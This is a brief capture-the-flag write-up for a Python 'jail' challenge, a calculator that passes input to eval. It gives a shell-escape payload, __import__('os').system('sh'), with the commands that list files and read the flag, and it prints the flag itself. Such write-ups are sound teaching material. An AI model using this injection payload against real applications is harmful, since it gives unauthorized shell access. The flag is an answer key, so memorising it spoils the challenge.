# Easy Jail

## Description

I made this calculator. I have a feeling that it's not safe :(

## Category

misc / jail

## Difficulty

Easy

## Attachments

- [challenge](./challenge/)

## Solution

The `eval` function is being used to evaluate the expression. This function can be dangerous since it interprets python code.

```
__import__('os').system('sh')
ls
cat flag.txt
```

# Flag

`KashiCTF{3V4L_41NT_54F3}`

